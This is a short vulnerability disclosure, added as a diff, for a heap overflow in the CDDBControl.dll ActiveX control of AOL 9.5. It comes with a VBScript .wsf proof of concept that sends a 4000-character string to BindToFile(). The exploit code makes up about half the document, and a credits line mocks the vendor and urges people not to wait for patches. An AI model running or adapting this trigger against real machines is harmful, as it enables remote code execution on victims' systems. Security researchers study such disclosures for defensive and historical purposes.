@@ -1,0 +1,44 @@
+Product:
+
+AOL 9.5
+
+Vulnerability:
+
+ActiveX - Heap Overflow
+
+Discussion:
+
+Vulnerability is in Activex Control ("CDDBControl.dll") 
+Sending a string to BindToFile() , triggering the vulnerability.
+Successful exploitation allow remote attackers to execute arbitrary code.
+
+Credits:
+
+Celil 'karak0rsan' Unuver and murderkey
+from Hellcode Research
+
+tcc.hellcode.net
+forum.hellcode.net
+
+
+L4stW0rdZ: "hi francis, do you think we forget you ??? ofcourse not, dont wait patch, dont support vendors
+and security industry ...." - mkey
+
+---------------
+PoC .wsf script:
+
+<package><job id='DoneInVBS' debug='false' error='true'>
+
+<object classid='clsid:BC8A96C6-3909-11D5-9001-00C04F4C3B9F' id='target' />
+
+<script language='vbscript'>
+
+
+arg1=String(4000, "A")
+arg2=1
+
+target.BindToFile arg1 ,arg2 
+
+</script>
+</job>
+</package>
